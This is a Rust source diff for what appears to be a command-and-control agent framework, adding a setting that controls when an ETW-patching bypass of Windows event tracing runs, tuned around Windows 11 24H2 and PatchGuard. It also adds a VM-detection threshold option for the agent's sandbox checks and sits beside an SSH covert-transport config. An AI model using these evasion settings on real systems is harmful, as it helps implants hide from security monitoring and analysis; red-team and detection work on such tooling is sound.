@@ -19,6 +19,26 @@ pub enum EtwPatchMethod {
     Hwbp,
 }
 
+/// Controls when the direct-patch ETW bypass is applied relative to the
+/// current Windows build number.
+///
+/// | Variant  | Behaviour |
+/// |----------|---------- |
+/// | `Safe`   | **Default.** Skip the patch on Windows 11 24H2 (build ≥ 26100) and later, where PatchGuard may detect ETW modifications and trigger a BSOD. |
+/// | `Always` | Apply the patch regardless of build number. Useful in controlled test environments where PatchGuard is disabled. |
+/// | `Never`  | Never apply the direct-patch bypass. Use when relying solely on the HWBP method or when ETW patching is undesirable. |
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
+#[serde(rename_all = "kebab-case")]
+pub enum EtwPatchMode {
+    /// Skip the patch on Windows builds ≥ 26100 (Win 11 24H2+).
+    #[default]
+    Safe,
+    /// Always apply the patch, regardless of build number.
+    Always,
+    /// Never apply the direct-patch bypass.
+    Never,
+}
+
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
 pub enum ExecStrategy {
@@ -156,6 +176,14 @@ pub struct MalleableProfile {
     /// weaken VM-refusal enforcement. Keep entries provider-specific.
     #[serde(default)]
     pub vm_detection_extra_hypervisor_names: Vec<String>,
+    /// When `true`, the VM-detection threshold is guaranteed to be at least 3
+    /// regardless of cloud-detection results.  Useful on restricted networks
+    /// where IMDS is firewalled and DMI strings are not in the built-in
+    /// expected-hypervisor list, preventing false-positive VM refusals.
+    ///
+    /// Default: `false` (backward-compatible behaviour).
+    #[serde(default)]
+    pub vm_detection_high_threshold_mode: bool,
     /// SSH relay hostname for the `ssh-transport` feature.
     #[serde(default)]
     pub ssh_host: Option<String>,
@@ -173,6 +201,14 @@ pub struct MalleableProfile {
     /// absent the agent accepts any key but logs a warning.
     #[serde(default)]
     pub ssh_host_key_fingerprint: Option<String>,
+    /// Controls when the direct-patch ETW bypass is applied.
+    ///
+    /// * `safe` (default) — skip the patch on Windows 11 24H2 (build ≥ 26100)
+    ///   where PatchGuard may detect ETW modifications and BSOD.
+    /// * `always` — always apply, regardless of build number (testing only).
+    /// * `never`  — never apply this bypass.
+    #[serde(default)]
+    pub etw_patch_mode: EtwPatchMode,
 }
 
 /// Authentication method for the SSH covert transport.
@@ -219,12 +255,12 @@ impl Default for MalleableProfile {
             cloud_instance_allow_without_imds: false,
             cloud_instance_fallback_ids: Vec::new(),
             vm_detection_extra_hypervisor_names: Vec::new(),
+            vm_detection_high_threshold_mode: false,
             ssh_host: None,
             ssh_port: None,
             ssh_username: None,
             ssh_auth: None,
-            ssh_host_key_fingerprint: None,
-        }
+            ssh_host_key_fingerprint: None,            etw_patch_mode: EtwPatchMode::default(),        }
     }
 }
 
